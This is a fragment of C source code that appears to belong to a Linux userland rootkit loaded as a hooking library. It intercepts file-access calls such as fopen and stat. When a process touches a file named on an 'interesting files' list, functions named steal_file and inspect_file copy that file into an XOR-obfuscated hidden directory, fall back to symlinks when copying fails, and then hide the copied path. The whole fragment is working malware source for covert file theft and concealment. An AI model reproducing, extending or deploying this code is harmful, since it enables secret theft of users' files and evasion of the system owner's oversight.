int interesting(const char *path){
    int v = 0;

    for(int i = 0; interesting_files[i] != NULL; i++){
        if(!xstrncmp(interesting_files[i], path)) v = 1;
        if(v) break;
    }

    return v;
}

char *get_filename(const char *path){
    char *pdup = strdup(path),
         *tok,
         *ret = (char *)malloc(512);
    if(strstr(pdup, "/")){
        tok = strtok(pdup, "/");
        while(tok != NULL){     /* this will break once we reach the filename */
            (void)strncpy(ret, tok, 512);
            tok = strtok(NULL, "/");
        }
        free(tok);
    }else (void)strncpy(ret, pdup, 512);
    free(pdup);
    return ret;
}

int write_copy(const char *old_path, char *new_path){
    char buf[LINE_MAX];
    FILE *nfp, *ofp;

    hook(CFOPEN);

    if((ofp = call(CFOPEN, old_path, "r")) == NULL) return -1;
    if((nfp = call(CFOPEN, new_path, "w")) == NULL){
        (void)fclose(ofp);
        return -1;
    }

    while(fgets(buf, sizeof(buf), ofp) != NULL){
        if(strlen(buf) == 0) break;
        (void)call(CFWRITE, buf, strlen(buf), 1, nfp);
    }

    (void)fclose(ofp);
    (void)fclose(nfp);
    return 1;
}

char *get_new_path(char *filename){
    char *ret = (char *)malloc(PATH_MAX + 4),
         *_filename = strdup(filename);

    if(_filename[0] == '.') memmove(_filename, _filename + 1, strlen(_filename));

    xor(interest_dir, INTEREST_DIR);
    (void)snprintf(ret, PATH_MAX + 4, "%s/%s-%d",
                                      interest_dir,
                                      _filename,
                                      process_info.myuid);
    clean(interest_dir);

    free(_filename);
    return ret;
}

int steal_file(const char *old_path, char *filename, char *new_path){
    struct stat astat, pstat;

    hook(C__XSTAT);

    memset(&astat, 0, sizeof(stat));
    memset(&pstat, 0, sizeof(stat));

    if((long)call(C__XSTAT, _STAT_VER, old_path, &astat) < 0) return -1;
    if(!S_ISREG(astat.st_mode)) return 1;   /* we only want to look at regular files. */

    /* file already exists(?) */
    if((long)call(C__XSTAT, _STAT_VER, new_path, &pstat)){   /* if the file's different. copy it. */
        if(pstat.st_size != astat.st_size) return write_copy(old_path, new_path);
    }else return write_copy(old_path, new_path);  /* file doesn't exist yet, let's write it */

    return -1;
}

#ifdef LINK_IF_ERR
int link_file(const char *old_path, char *new_path){
    (void)strncat(new_path, "-link", strlen("-link") + 1);
    hook(CSYMLINK);
    return (long)call(CSYMLINK, old_path, new_path);
}
#endif

void inspect_file(const char *pathname){
    char *filename = get_filename(pathname),
         *new_path = get_new_path(filename);

    if(interesting(pathname) || interesting(filename)){  /* is pathname of interest to us? */
        /* try to copy the file to our interesting directory */
        int steal_status = steal_file(pathname, filename, new_path);

#ifdef LINK_IF_ERR
        if(steal_status < 0)
            if(link_file(pathname, new_path) < 0)
                goto end_inspect_file;
#else
        if(steal_status < 0) goto end_inspect_file;
#endif

        /* can only hide the new file path if we're root.
           but that's alright because the directory itself will be hidden. */
        hide_path(new_path);
    }
end_inspect_file:
    free(filename);
    free(new_path);
}